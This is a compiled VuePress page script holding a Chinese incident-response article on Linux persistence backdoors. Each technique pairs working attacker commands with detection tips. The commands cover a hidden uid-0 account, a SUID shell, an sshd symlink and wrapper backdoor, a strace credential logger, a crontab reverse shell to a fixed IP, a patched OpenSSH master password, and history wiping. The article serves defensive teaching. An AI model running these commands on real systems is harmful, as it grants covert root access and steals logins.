"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[24680],{55848:(s,n,a)=>{a.r(n),a.d(n,{comp:()=>h,data:()=>b});var e=a(92565);const i=a.p+"assets/img/privilege-5-1-20241018162058-b8ephsa.119996c4.png",l=a.p+"assets/img/privilege-5-2-20241018162058-n5qfefx.8c2ea053.png",p=a.p+"assets/img/privilege-5-4-20241018162058-ksdqlwn.ebcb9dc5.png",d=a.p+"assets/img/privilege-5-4-1-20241018162058-weg2z93.2daec93f.png",t=a.p+"assets/img/privilege-5-5-20241018162058-8yk757o.6bc16a18.png",r=a.p+"assets/img/privilege-5-5-1-20241018162058-kpygcvd.bec7eda0.png",c=a.p+"assets/img/privilege-5-5-2-20241018162058-eaq1y5f.386654b6.png",u=a.p+"assets/img/privilege-5-6-20241018162058-a1gqu08.bd4d89e4.png",o=a.p+"assets/img/privilege-5-7-20241018162058-sv1jibu.9bd413e0.png",g={},h=(0,a(17275).A)(g,[["render",function(s,n){return(0,e.uX)(),(0,e.CE)("div",null,[...n[0]||(n[0]=[(0,e.Fv)('<h1 id="第4篇-linux权限维持-后门篇" tabindex="-1"><a class="header-anchor" href="#第4篇-linux权限维持-后门篇"><span>第4篇：Linux权限维持--后门篇</span></a></h1><p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p><p><strong>1、一句话添加用户和密码</strong></p><p>添加普通用户：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># 创建一个用户名guest，密码123456的普通用户</span></span>\n<span class="line"><span>useradd -p `openssl passwd -1 -salt &#39;salt&#39; 123456` guest</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span># useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span></span>\n<span class="line"><span>useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span></span>\n<span class="line"><span>\t</span></span>\n<span class="line"><span># chpasswd方法</span></span>\n<span class="line"><span>useradd guest;echo &#39;guest:123456&#39;|chpasswd</span></span>\n<span class="line"><span>\t</span></span>\n<span class="line"><span># echo -e方法</span></span>\n<span class="line"><span>useradd test;echo -e &quot;123456\\n123456\\n&quot; |passwd test</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>添加root用户：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># 创建一个用户名guest，密码123456的root用户</span></span>\n<span class="line"><span>useradd -p `openssl passwd -1 -salt &#39;salt&#39; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>可疑用户排查技巧：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># 查询特权用户特权用户(uid 为0)</span></span>\n<span class="line"><span>[root@localhost ~]# awk -F: &#39;$3==0{print $1}&#39; /etc/passwd</span></span>\n<span class="line"><span># 查询可以远程登录的帐号信息</span></span>\n<span class="line"><span>[root@localhost ~]# awk &#39;/\\$1|\\$6/{print $1}&#39; /etc/shadow</span></span>\n<span class="line"><span># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span></span>\n<span class="line"><span>[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>2、SUID Shell</strong></p><p>Suid shell是一种可用于以拥有者权限运行的shell。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>配合普通用户权限使用</span></span>\n<span class="line"><span>cp /bin/bash /tmp/shell</span></span>\n<span class="line"><span>chmod u+s /tmp/shell</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用guest用户登录就可疑获取root权限。</p><figure><img src="'+i+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p><p>排查技巧：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># 在Linux中查找SUID设置的文件</span></span>\n<span class="line"><span>find . -perm /4000 </span></span>\n<span class="line"><span># 在Linux中查找使用SGID设置的文件</span></span>\n<span class="line"><span>find . -perm /2000</span></span>\n<span class="line"><span># 取消s权限</span></span>\n<span class="line"><span>chmod u-s /tmp/shell</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>3、ssh公私钥免密登录</strong></p><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>客户端：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>ssh-keygen -t rsa</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>过程中按三次回车，执行结束如下图:</p><figure><img src="'+l+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：</p><figure><img src="data:image/png;base64," alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p><p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p><p><strong>4、软连接</strong></p><p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p><p>在目标服务器上执行一句话后门：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p><figure><img src="'+p+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p><figure><img src="'+d+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>5、SSH wrapper</strong></p><p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>服务端：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>cd /usr/sbin/</span></span>\n<span class="line"><span>mv sshd ../bin/</span></span>\n<span class="line"><span>echo &#39;#!/usr/bin/perl&#39; &gt;sshd</span></span>\n<span class="line"><span>echo &#39;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd</span></span>\n<span class="line"><span>echo &#39;exec{&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span></span>\n<span class="line"><span>chmod u+x sshd</span></span>\n<span class="line"><span>/etc/init.d/sshd restart</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>客户端：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>socat STDIO TCP4:target_ip:22,sourceport=13377</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span></span>\n<span class="line"><span>&gt;&gt;&gt; import struct</span></span>\n<span class="line"><span>&gt;&gt;&gt; buffer = struct.pack(&#39;&gt;I6&#39;,19526)</span></span>\n<span class="line"><span>&gt;&gt;&gt; print repr(buffer)</span></span>\n<span class="line"><span>&#39;\\x00\\x00LF&#39;</span></span>\n<span class="line"><span>&gt;&gt;&gt; buffer = struct.pack(&#39;&gt;I6&#39;,13377)</span></span>\n<span class="line"><span>&gt;&gt;&gt; print buffer</span></span>\n<span class="line"><span>4A</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="'+t+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>排查技巧：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># ls -al /usr/sbin/sshd</span></span>\n<span class="line"><span># cat /usr/sbin/sshd</span></span>\n<span class="line"><span>可通过重装ssh服务恢复。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>6、strace后门</strong></p><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#vim /etc/bashrc</span></span>\n<span class="line"><span>alias ssh=&#39;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#39;</span></span>\n<span class="line"><span># source /root/.bashrc</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="'+r+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>排查技巧：使用<code>alias</code>即可发现异常。</p><figure><img src="'+c+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>7、crontab反弹shell</strong></p><p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>a、创建shell脚本，例如在/etc/evil.sh</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#!/bin/bash</span></span>\n<span class="line"><span>bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><code>chmod +sx /etc/evil.sh</code></p><p>b、crontab -e 设置定时任务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#每一分钟执行一次</span></span>\n<span class="line"><span>*/1 * * * * root /etc/evil.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p><figure><img src="'+u+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>排查技巧：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># 查看可疑的定时任务列表</span></span>\n<span class="line"><span>crontab -e</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>8、openssh后门</strong></p><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>a、备份SSH配置文件</span></span>\n<span class="line"><span>mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span></span>\n<span class="line"><span>mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>b、解压并安装补丁</span></span>\n<span class="line"><span>tar zxf openssh-5.9p1.tar.gz</span></span>\n<span class="line"><span>tar zxf openssh-5.9p1.tar.gz</span></span>\n<span class="line"><span>cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1</span></span>\n<span class="line"><span>cd openssh-5.9p1</span></span>\n<span class="line"><span>patch &lt; sshbd5.9p1.diff</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>c、记录用户名和密码的文件位置及其密码</span></span>\n<span class="line"><span>vi  includes.h</span></span>\n<span class="line"><span>\t#define ILOG &quot;/tmp/1.txt&quot;             //记录登录本机的用户名和密码</span></span>\n<span class="line"><span>\t#define OLOG &quot;/tmp/2.txt&quot;             //记录本机登录远程的用户名和密码</span></span>\n<span class="line"><span>\t#define SECRETPW &quot;123456789&quot;          //后门的密码</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>d、修改版本信息</span></span>\n<span class="line"><span>vi version.h</span></span>\n<span class="line"><span>\t#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span></span>\n<span class="line"><span>\t#define SSH_PORTABLE &quot;小版本号&quot;</span></span>\n<span class="line"><span>\t</span></span>\n<span class="line"><span>e、安装并编译</span></span>\n<span class="line"><span>./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span></span>\n<span class="line"><span>make clean</span></span>\n<span class="line"><span>make &amp;&amp; make install</span></span>\n<span class="line"><span>service sshd restart</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span></span>\n<span class="line"><span>touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>g、清除操作记录</span></span>\n<span class="line"><span>export HISTFILE=/dev/null</span></span>\n<span class="line"><span>export HISTSIZE=0</span></span>\n<span class="line"><span>echo &gt;/root/.bash_history //清空操作日志</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>排查技巧：利用strace找出ssh后门.</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># 1、获取可疑进程PI</span></span>\n<span class="line"><span>ps aux | grep sshd</span></span>\n<span class="line"><span># 2、跟踪sshd PID</span></span>\n<span class="line"><span>strace -o aa -ff -p  PID</span></span>\n<span class="line"><span># 3、查看记录密码打开文件</span></span>\n<span class="line"><span>grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>9、PAM后门</strong></p><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p><p>利用方法:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span></span>\n<span class="line"><span>2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span></span>\n<span class="line"><span>3、编译安装PAM</span></span>\n<span class="line"><span>4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>排查技巧：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># 1、通过Strace跟踪ssh</span></span>\n<span class="line"><span>ps axu | grep sshd</span></span>\n<span class="line"><span>strace -o aa -ff -p PID</span></span>\n<span class="line"><span>grep open aa* | grep -v -e No -e null -e denied| grep WR</span></span>\n<span class="line"><span># 2、检查pam_unix.so的修改时间</span></span>\n<span class="line"><span>stat /lib/security/pam_unix.so      #32位</span></span>\n<span class="line"><span>stat /lib64/security/pam_unix.so    #64位</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>10、rookit后门</strong></p><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p><p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p><p>连接后的截图：</p><figure><img src="'+o+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p>',79)])])}]]),b=JSON.parse('{"path":"/response/%E3%80%90%E4%B8%93%E9%A2%98%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html","title":"第4篇：Linux权限维持--后门篇","lang":"zh-CN","frontmatter":{"title":"第4篇：Linux权限维持--后门篇","short_title":"Linux权限维持--后门篇","date":"2024-10-18T16:20:58.000Z","description":"应急响应实战笔记：Linux权限维持--后门篇","tag":["应急响应","权限维持"],"category":["应急响应"],"timeline":false,"isOriginal":true,"index":true,"order":4,"head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"第4篇：Linux权限维持--后门篇\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2024-10-18T16:20:58.000Z\\",\\"dateModified\\":\\"2026-11-22T12:54:38.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"],["meta",{"property":"og:url","content":"https://min168.top/response/%E3%80%90%E4%B8%93%E9%A2%98%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%AE%9E%E6%88%98/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"第4篇：Linux权限维持--后门篇"}],["meta",{"property":"og:description","content":"应急响应实战笔记：Linux权限维持--后门篇"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2026-11-22T12:54:38.000Z"}],["meta",{"property":"article:tag","content":"权限维持"}],["meta",{"property":"article:tag","content":"应急响应"}],["meta",{"property":"article:published_time","content":"2024-10-18T16:20:58.000Z"}],["meta",{"property":"article:modified_time","content":"2026-11-22T12:54:38.000Z"}]]},"git":{"createdTime":1795352078000,"updatedTime":1795352078000,"contributors":[{"name":"ezouy","username":"ezouy","email":"youze27@163.com","commits":1,"url":"https://github.com/ezouy"}],"changelog":[{"hash":"e98b3485c6760c3173c229928061f68f6dc3fd58","time":1795352078000,"email":"youze27@163.com","author":"ezouy","message":"docs: 归档待整理笔记，补全红队信息收集与凭据提取工具文章"}]},"readingTime":{"minutes":7.04,"words":2111},"filePathRelative":"response/【专题】应急响应实战/第03章：权限维持篇/第4篇：Linux权限维持--后门篇.md","excerpt":"\\n<p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p>\\n<p><strong>1、一句话添加用户和密码</strong></p>\\n<p>添加普通用户：</p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code class=\\"language-\\"><span class=\\"line\\"><span># 创建一个用户名guest，密码123456的普通用户</span></span>\\n<span class=\\"line\\"><span>useradd -p `openssl passwd -1 -salt \'salt\' 123456` guest</span></span>\\n<span class=\\"line\\"><span></span></span>\\n<span class=\\"line\\"><span># useradd -p 方法  ` ` 是用来存放可执行的系统命令,\\"$()\\"也可以存放命令执行语句</span></span>\\n<span class=\\"line\\"><span>useradd -p \\"$(openssl passwd -1 123456)\\" guest</span></span>\\n<span class=\\"line\\"><span>\\t</span></span>\\n<span class=\\"line\\"><span># chpasswd方法</span></span>\\n<span class=\\"line\\"><span>useradd guest;echo \'guest:123456\'|chpasswd</span></span>\\n<span class=\\"line\\"><span>\\t</span></span>\\n<span class=\\"line\\"><span># echo -e方法</span></span>\\n<span class=\\"line\\"><span>useradd test;echo -e \\"123456\\\\n123456\\\\n\\" |passwd test</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>"}')}}]);